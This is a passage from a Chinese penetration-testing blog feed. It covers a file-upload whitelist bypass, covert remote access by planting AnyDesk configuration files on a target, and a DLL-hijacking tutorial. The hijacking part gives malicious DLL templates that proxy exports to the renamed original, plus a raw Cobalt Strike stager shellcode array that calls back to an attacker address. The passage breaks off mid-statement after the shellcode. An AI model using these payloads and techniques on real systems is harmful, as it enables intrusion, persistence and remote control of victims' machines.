class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$file</span>)) &#123;<br>           <span class="hljs-variable">$file</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, strtolower(<span class="hljs-variable">$file</span>));<br>       &#125;<br></code></pre></td></tr></table></figure><p>判断是否为数组，如果不是数据就以”.”拆分为数组<br>4.判断后缀是否是白名单的.jpg、.png、.gif</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$ext</span> = end(<span class="hljs-variable">$file</span>);<br>       <span class="hljs-variable">$allow_suffix</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>       <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>))<br></code></pre></td></tr></table></figure><p>5.一切都过了之后就是文件重命名了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$file_name</span> = reset(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[count(<span class="hljs-variable">$file</span>) - 1];<br></code></pre></td></tr></table></figure><p>取数组第一个为文件名，取数组倒数第二个为文件后缀</p><p>绕过步骤：<br><img src="https://img-blog.csdnimg.cn/20210616133014764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>upload&#x2F;upload.php.后面多个.但是windows环境下.会被默认去掉</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>未开启3389实现远程桌面</title>
    <link href="/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/"/>
    <url>/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<p>在内网渗透时如果目标没有开启3389，或者通过某种手段给禁用掉了。此时我们就可以通过今天介绍的工具进行远程连接。<br><strong>项目地址</strong><br><a href="https://download.anydesk.com/AnyDesk.exe">https://download.anydesk.com/AnyDesk.exe</a><br>打开应用<br><img src="https://img-blog.csdnimg.cn/55b1566a5305416691b7262b26a99ddc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c02a6cb238ff42feb1898611a194f2c4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置连接的用户名和密码</p><p>退出本地的AnyDesk,然后到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">c:\Users\&#123;USER&#125;\AppData\Roaming\AnyDesk    目录下将<br>ad.trace、service.conf、system.conf、user.conf<br>这个<span class="hljs-number">4</span>个文件上传到目标的c:\Users\&#123;目标在线的用户&#125;\AppData\Roaming\AnyDesk目录下。<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/92e45b4085a949b5b7c65244888a459f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将AnyDesk也上传到目标服务器（任意目录都行，最好修改一下文件名）。然后以在线的那个用户的权限去执行AnyDesk这个程序。最后删除本机的前四个文件配置文件（不删除就相当于有两个一样的地址，就不知道是连接的谁），启动本机的AnyDesk输入一开始你AnyDesk的连接地址，连接成功后输入前面设置的密码即可。<br><img src="https://img-blog.csdnimg.cn/8d9ae2cba61d4ac194b4ba0f498d349a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a22cdc148d954d018bd4ce9564d8516b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功连接</p><p>参考：<a href="https://mp.weixin.qq.com/s/QgCQQMVLGzSIjP-sroiMDw">https://mp.weixin.qq.com/s/QgCQQMVLGzSIjP-sroiMDw</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>3389</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dll劫持</title>
    <link href="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/"/>
    <url>/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h2 id="dll是什么"><a href="#dll是什么" class="headerlink" title="dll是什么"></a>dll是什么</h2><p>dll为动态链接库文件，又称”应用程序拓展”，是软件文件类型。在Windows中许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库文件，即dll文件，放置于系统中，个人理解类似于我们编程中引入的模块。<br><img src="https://img-blog.csdnimg.cn/84a6ea0d511a4d92a0eddbed77137193.png" alt="在这里插入图片描述"></p><ul><li><p><strong>静态编译</strong>:debug状态下：MTd release状态下：MT</p></li><li><p><strong>动态编译</strong>:debug状态下：MDd release状态下：MD</p><p>  动态编译的生成的可执行文件的exe小，但是运行需要系统环境具有相关的dll和lib文件，就是动态调用系统相关的文件才能运行；</p><p>  静态编译生成的可执行文件exe大，但是运行的时候不依赖于系统环境所依赖的dll和lib等环境问题，在编译的时候已经这些dll相关文件编译进了exe文件，所以exe文件较大。所以需要自己创建的工程需要在别的电脑上运行，考虑到稳定性，同时对执行文件的大小没有要求的话还是尽量选择静态编译。</p></li></ul><h2 id="dll劫持漏洞原理"><a href="#dll劫持漏洞原理" class="headerlink" title="dll劫持漏洞原理"></a>dll劫持漏洞原理</h2><p>如果在一个进程加载dll时没有指定dll的绝对路径，那么windows会尝试去按照顺序搜索这些特定目录来查找这个dll。如果攻击者将恶意的dll放在优先于正常dll所在目录，那么就能够欺骗系统去加载恶意的dll,形成dll劫持。</p><h2 id="DLL路径搜索目录顺序"><a href="#DLL路径搜索目录顺序" class="headerlink" title="DLL路径搜索目录顺序"></a>DLL路径搜索目录顺序</h2><ul><li>程序加载目录</li><li>系统目录。使用GetSystemDirectory获取该路径</li><li>16位系统目录</li><li>windows目录，使用GetWindowsDirectory获取该路径</li><li>windows当前目录</li><li>PATH环境变量中列出的目录</li></ul><h2 id="Know-Dlls注册表项"><a href="#Know-Dlls注册表项" class="headerlink" title="Know Dlls注册表项"></a>Know Dlls注册表项</h2><p>从windows7之后，微软为了更进一步的防御系统的dll劫持，将一些容易被劫持的系统dll写进了一个注册表项中，那么凡是在此项目下的dll文件就会被禁止从exe自身所在目录下调用，而只能从系统目录即system32目录下调用</p><ul><li><strong>默认情况下：</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode<br></code></pre></td></tr></table></figure><p>处于开启状态，如果手动设置为0，关闭该安全选项，搜索顺序为：在以上顺序的基础上，将 当前目录   修改至    系统目录   的位置，其他顺移。</p><p>另外当前应用程序加载dll时如果仅指定dll名称时，那么将按照以上顺序搜索dll文件，不过在加载之前还需要满足以下两条规范：<br>1.当内存中已加载相同模块名称的dll时，系统将直接夹在该dll,不会进行搜索，除非设置了dll重定向选项<br>2.如果要加载的dll模块属于known dlls，系统直接加载系统目录下的该dll，不会进行搜索</p><p>windows操作系统通过”dll路径搜索目录顺序”和“known dlls注册表项”来确定应用程序所要调用的dll的路径，当一个进程尝试加载一个dll的时候，会先尝试搜索程序所处的目录，若还没有找到，则向下搜索16位系统目录即system目录，然后windows目录，当前目录，path环境变量的各个目录。<br><img src="https://img-blog.csdnimg.cn/938cfcaba02747eea3a3a77feba8b42f.png" alt="在这里插入图片描述"><br>这样的加载顺序很容易就会导致一个系统的dll被劫持，只要攻击者将目标文件和恶意dll放在一起即可导致恶意dll搜索顺序优先于系统dll目录加载，就能够欺骗系统去加载恶意的dll，形成”dll劫持”。</p><h2 id="手动劫持"><a href="#手动劫持" class="headerlink" title="手动劫持"></a>手动劫持</h2><ul><li><strong>劫持程序运行时加载的未知dll</strong><br>用到的工具 Process Monitor v3.60<br>通过process monitor监控dll调用是一种最基础的寻找dll劫持的方式<br>设置过滤规则:(默认的不需要改变)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Path ends with .dll<br>Result is NAME NOT FOUND<br>Process Name contains 进程名称<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/aea43644cc5e421180df2220e6e9cc06.png" alt="在这里插入图片描述"><br>然后这里找到一个需要用到loadlibrary这个api的dll，这里找有个api的原因是因为如果该dll的调用栈中存在有 **loadlibrary(Ex) * *,说明这个dll被进程所动态加载的。如果这种利用场景下，伪造的dll文件不需要存在任何导出函数即可被成功加载，即使加载后进程内部出错，也是在dll被加载成功加载之后的事情。<br>loadlibrary和loadlibraryex是一个本地加载，一个是远程加载，如果dll不在调用的同一目录下，就可以使用loadlibrary(L”DLL绝对路径”)加载。但是如果DLL内部又调用一个DLL，就需要使用loadlibraryex进行远程加载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">LoadLibraryEx(“DLL绝对路径”, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);<br></code></pre></td></tr></table></figure><p>LoadLibraryEx的最后一个参数设置为load_With_altered_Search_path即可让系统dll搜索顺序从我们设置的目录开始</p><p>找到可以被劫持的dll文件<br><img src="https://img-blog.csdnimg.cn/2f08b624d5e24e89be3acd1bd7a35911.png" alt="在这里插入图片描述"><br>编写恶意的dll</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">// dllmain.cpp : 定义 DLL 应用程序的入口点。<br><span class="hljs-comment">#include &quot;pch.h&quot;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><br>BOOL APIENTRY DllMain( HMODULE hModule,<br>                       DWORD  ul_reason_for_call,<br>                       LPVOID lpReserved<br>                     )<br>&#123;<br>    switch (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    system(<span class="hljs-string">&quot;calc&quot;</span>);<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-built_in">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>用vs创建dll项目，并生成<br><img src="https://img-blog.csdnimg.cn/95c180c0a7e9420d88e3ae49756b7d71.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b4991efb66e341f69fb2ef8df9dc0401.png" alt="在这里插入图片描述"></p><ul><li><strong>劫持程序某个功能调用的dll文件</strong><br>某个exe程序运行的时候，监控某个功能(例如截图)所调用的dll文件<br>1.使用CFFExplorer工具查看该文件(dll文件名为B)，导出目录里的kerbel32.dll里是否调用了LoadLibrary<br>2.如果调用了LoadLibrary,则在导出目录找导出的函数名(函数名为C)<br>3.自己编写dll，重命名为B.dll，将原先的B.dll重命名为B_origin.dll。B.dll代码里用LoadLibrary调用B_origin.dll<br>4.运行该程序的某个功能，即可劫持</li></ul><p>代码demo<br>extern导出函数的代码可以用rundll32 dllExtern.dll   test(函数名)  调用extern “C” extern “C”使得在C++中使用c编译方式成为可能。在c++下定义c函数，需要加extern “C”关键字。用extern “C”来指明该函数使用c编译方式。输出的”c”函数可以从”c”代码里调用<br>__declspec(dllexport)的作用就是让编译器按照某种预定的方式来输出导出函数及变量的符号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">动态链接库文件中包含若干公用的代码、数据库等。供其他模块使用。动态链接库是将应用程序模块化的重要方法、动态链接库中的函数和数据可以同时供其他多个可执行文件使用，不同的可执行文件可以调用同一个动态链接库中的函数。DLL中函数经过<span class="hljs-string">&quot;导出&quot;</span>后可以被exe文件中的程序调用<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#include &lt;Windows.h&gt; // 这是导出变量的一个示例 </span><br>extern <span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) void __cdecl <span class="hljs-built_in">test</span>(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,int nCmdShow) <br>&#123;<br> WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_HIDE);<br>  <span class="hljs-built_in">return</span>; <br>  &#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a2c14fe8e5c04aa4b9bf9a99fab63887.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#劫持dll的代码模板</span><br><span class="hljs-comment">#假设程序加载的dll名字为B，B.dll的导出函数为C</span><br><span class="hljs-comment">#劫持的dll名字改为B</span><br><span class="hljs-comment">#B.dll改为B_Origin.dll</span><br><span class="hljs-comment">#PrScrn改为C</span><br><span class="hljs-comment">#PrScrn_Origial.dll改为B_Origin.dll</span><br><span class="hljs-comment">#include &lt;Windows.h&gt;</span><br>extern <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) void PrScrn();<br>BOOL APIENTRY DllMain( HMODULE hModule,<br>                       DWORD  ul_reason_for_call,<br>                       LPVOID lpReserved<br>                     )<br>&#123;<br>    switch (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_HIDE);            //我们要攻击的恶意代码<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-built_in">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">return</span> TRUE;<br>&#125;<br>void <span class="hljs-function"><span class="hljs-title">PrScrn</span></span>()<br>&#123;<br>    MessageBox(NULL, L<span class="hljs-string">&quot;DLL Hijack! by DLLHijacker!&quot;</span>, L<span class="hljs-string">&quot;:)&quot;</span>, 0);  //我们要攻击的恶意代码<br>    HINSTANCE hDllInst = LoadLibrary(L<span class="hljs-string">&quot;PrScrn_Origial.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (hDllInst)<br>    &#123;<br>        typedef DWORD(WINAPI *EXPFUNC)();<br>        EXPFUNC exportFunc = NULL;<br>        exportFunc = (EXPFUNC)GetProcAddress(hDllInst, <span class="hljs-string">&quot;PrScrn&quot;</span>);<br>        <span class="hljs-keyword">if</span> (exportFunc)<br>        &#123;<br>            exportFunc();<br>        &#125;<br>        FreeLibrary(hDllInst);<br>    &#125;<br>    <span class="hljs-built_in">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>实验：<br>process monitor做以下规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Path ends with .dll<br>Result is SUCCESS<br>Process Name contains 进程名称<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/7cc770d23ebb43269332dd94069070a9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d37c165f0a2440a0a56519e0a0ea83c7.png" alt="在这里插入图片描述"><br>使用CFFExplorer查看目标dll文件<br><img src="https://img-blog.csdnimg.cn/d1bb8e4a1c444da793a6b5536abb6792.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2c991ae12b9a433fb0146b41e3846d36.png" alt="在这里插入图片描述"><br>任选一个函数(存在LoadLibraryExW的dll文件的导出目录如果是多个函数，每个函数都可以劫持！)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#include &lt;Windows.h&gt;</span><br><span class="hljs-comment">#include &quot;pch.h&quot;</span><br>extern <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) void beNotified();<br>BOOL APIENTRY DllMain(<br>HMODULE hModule,<br>DWORD ul_reason_for_call,<br>LPVOID lpReserved<br>) &#123;<br>switch (ul_reason_for_call) &#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_HIDE); //我们要攻击的恶意代码 <br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br><span class="hljs-built_in">break</span>;<br>&#125;<br><span class="hljs-built_in">return</span> TRUE;<br>&#125;<br>void <span class="hljs-function"><span class="hljs-title">beNotified</span></span>() &#123;<br>MessageBox(NULL, L<span class="hljs-string">&quot;DLL Hijack! by DLLHijacker!&quot;</span>, L<span class="hljs-string">&quot;:)&quot;</span>, 0); //我们要攻击的恶意代码 <br>HINSTANCE hDllInst = LoadLibrary(L<span class="hljs-string">&quot;NppCoverter_Origial.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hDllInst) &#123;<br>typedef DWORD(WINAPI *EXPFUNC)();<br>EXPFUNC exportFunc = NULL;<br>exportFunc = (EXPFUNC)GetProcAddress(hDllInst, <span class="hljs-string">&quot;beNotified&quot;</span>);<br><span class="hljs-keyword">if</span> (exportFunc) &#123;<br>exportFunc();<br>&#125;<br>FreeLibrary(hDllInst);<br>&#125;<br><span class="hljs-built_in">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d574cfc0391940029887e151f196b9f8.png" alt="在这里插入图片描述"></p><p>将编译好的文件放到目标dll同目录下，并且重命名为NppCoverter.dll。原先的NppCoverter.dll重命名为NppCoverter_Origial.dll</p><p><img src="https://img-blog.csdnimg.cn/a43eb1f9a29545a5984d8db68db662b5.png" alt="在这里插入图片描述"><br>执行程序<br><img src="https://img-blog.csdnimg.cn/6ed66f14a05d46d3b903a798a6f76359.png" alt="在这里插入图片描述"></p><h2 id="aheadlib工具劫持"><a href="#aheadlib工具劫持" class="headerlink" title="aheadlib工具劫持"></a>aheadlib工具劫持</h2><p>这里演示程序为极速pdf<br><a href="https://jisupdf.com/">https://jisupdf.com/</a><br>安装好有得到如下文件<br><img src="https://img-blog.csdnimg.cn/464b9c9550a3464ab0483cf3b98b821e.png" alt="在这里插入图片描述"><br>这里先用cobalt strike生成payload<br><img src="https://img-blog.csdnimg.cn/45c971d6729343f683e3d270852d2232.png" alt="在这里插入图片描述"><br>设置好监听，然后生成<br><img src="https://img-blog.csdnimg.cn/de53f4355dfe46fbb97c5f25430d4582.png" alt="在这里插入图片描述"><br>打开工具aheadlib,然后这里以sqlite3.dll为例<br><img src="https://img-blog.csdnimg.cn/f864defc370d466ba8b8885d1f7ddd7c.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fc11f7b403de45ef9bd2648ad4d9081b.png" alt="在这里插入图片描述"><br>然后就会生成一个cpp文件<br>新建一个dll项目<br><img src="https://img-blog.csdnimg.cn/8f330a80b59743bebea3907a7c0ce0fa.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/38264e83c80a443fb7122cfebe49f26d.png" alt="在这里插入图片描述"><br>将生成的cpp文件覆盖到dllmain.cpp文件中<br><img src="https://img-blog.csdnimg.cn/5124b2bd7e934d0b98efafe0e1e9faa2.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/700b84416cc34ec3b780831fab2b1cdd.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>unsigned char buf[] = <span class="hljs-string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x90\x1f\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x74\x47\x39\x68\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x41\x55\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x35\x33\x2e\x34\x36\x00\x00\x00\x00\x00&quot;</span>;<br>void *<span class="hljs-built_in">exec</span> = 